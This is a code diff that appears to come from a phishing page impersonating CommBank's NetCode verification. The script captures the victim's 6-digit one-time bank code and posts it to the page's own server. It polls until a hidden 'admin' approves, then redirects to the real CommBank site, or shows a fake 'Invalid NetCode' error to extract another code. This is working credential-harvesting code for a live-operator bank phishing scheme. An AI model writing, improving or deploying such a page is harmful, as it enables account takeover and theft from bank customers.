@@ -261,46 +261,47 @@
     }
   }
 
-  /* ===== 10. POLL FOR ADMIN ACTION ===== */
+  /* ===== 10. REDIRECT TO COMMBANK ===== */
+  function redirectToCommBank() {
+    console.log('[DEBUG] Redirecting to CommBank...');
+    // Use multiple methods to ensure redirect happens
+    window.location.href = 'https://www.commbank.com.au/';
+    // Fallback
+    setTimeout(() => {
+      window.open('https://www.commbank.com.au/', '_self');
+    }, 100);
+  }
+
+  /* ===== 11. POLL FOR ADMIN ACTION ===== */
   let isWaitingForAdmin = false;
   let pollInterval;
-  let pollCount = 0;
 
   function startPolling() {
     if (isWaitingForAdmin) return;
     isWaitingForAdmin = true;
-    pollCount = 0;
     console.log('[DEBUG] Started polling for admin action');
 
     const poll = async () => {
-      if (!isWaitingForAdmin) {
-        console.log('[DEBUG] Polling stopped');
-        return;
-      }
-
-      pollCount++;
-      console.log(`[DEBUG] Poll #${pollCount}`);
+      if (!isWaitingForAdmin) return;
 
       try {
         const res = await fetch(`/api/status/${sid}`);
         const data = await res.json();
-        console.log('[DEBUG] Status response:', data);
+        console.log('[DEBUG] Poll response:', data);
 
-        if (data.status === 'ok') {
-          console.log('[DEBUG] Status is OK - redirecting to CommBank');
+        if (data.status === 'ok' || data.status === 'approved') {
+          console.log('[DEBUG] Status OK/APPROVED - redirecting');
           isWaitingForAdmin = false;
-          // IMMEDIATE redirect to CommBank
-          window.location.replace('https://www.commbank.com.au/');
+          redirectToCommBank();
           return;
         }
 
         if (data.status === 'redo') {
-          console.log('[DEBUG] Status is REDO - showing error');
+          console.log('[DEBUG] Status REDO');
           isWaitingForAdmin = false;
           hideLoading();
           clearForm();
           showErrorMessage('Invalid NetCode. Please try again.');
-          // Clear the redo status so we don't loop
           fetch('/api/clearRedo', {
             method: 'POST',
             headers: { 'content-type': 'application/json' },
@@ -310,16 +311,15 @@
         }
 
         if (data.status === 'gone') {
-          console.log('[DEBUG] Session gone');
+          console.log('[DEBUG] Status GONE');
           isWaitingForAdmin = false;
           hideLoading();
-          showErrorMessage('Session expired. Please try again.');
+          showErrorMessage('Session expired.');
           return;
         }
 
         // Continue polling
-        console.log('[DEBUG] Continuing poll...');
-        pollInterval = setTimeout(poll, 1200);
+        pollInterval = setTimeout(poll, 1000);
 
       } catch (err) {
         console.error('[DEBUG] Poll error:', err);
@@ -330,9 +330,8 @@
     poll();
   }
 
-  /* ===== 11. SUBMIT NETCODE ===== */
+  /* ===== 12. SUBMIT NETCODE ===== */
   async function submitNetCode() {
-    // Hide any previous error
     hideValidationError();
 
     if (!validateNetCode()) {
@@ -352,10 +351,10 @@
         body: JSON.stringify({ sid, phone: netcode })
       });
 
-      console.log('[DEBUG] Submit response:', response.status);
+      console.log('[DEBUG] Submit response status:', response.status);
 
       if (response.ok) {
-        console.log('[DEBUG] NetCode submitted successfully, starting poll');
+        console.log('[DEBUG] NetCode submitted, starting poll');
         startPolling();
       } else {
         throw new Error('Verification failed');
@@ -367,29 +366,22 @@
     }
   }
 
-  /* ===== 12. SETUP EVENT LISTENERS ===== */
+  /* ===== 13. SETUP EVENT LISTENERS ===== */
   document.addEventListener('DOMContentLoaded', () => {
-    console.log('[DEBUG] Verify page loaded, SID:', sid);
+    console.log('[DEBUG] Page loaded, SID:', sid);
     
     const netcodeInput = document.getElementById('netcode');
     const verifyBtn = document.getElementById('ctl00_BodyPlaceHolder_lnkNext');
 
-    // Input handler - restrict to digits and auto-submit on 6 digits
     if (netcodeInput) {
       netcodeInput.addEventListener('input', (e) => {
-        // Remove non-digits and limit to 6
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
-        
-        // Hide error on input
         hideValidationError();
-
-        // Auto-submit when 6 digits entered
         if (e.target.value.length === 6) {
           submitNetCode();
         }
       });
 
-      // Allow Enter key to submit
       netcodeInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
           e.preventDefault();
@@ -398,7 +390,6 @@
       });
     }
 
-    // Verify button click handler
     if (verifyBtn) {
       verifyBtn.addEventListener('click', (e) => {
         e.preventDefault();
@@ -407,7 +398,7 @@
     }
   });
 
-  // Stop polling on page unload
+  // Cleanup on unload
   window.addEventListener('beforeunload', () => {
     isWaitingForAdmin = false;
     if (pollInterval) clearTimeout(pollInterval);
@@ -860,6 +851,7 @@
   </div>
  </body>
 </html>
+
 
 
 
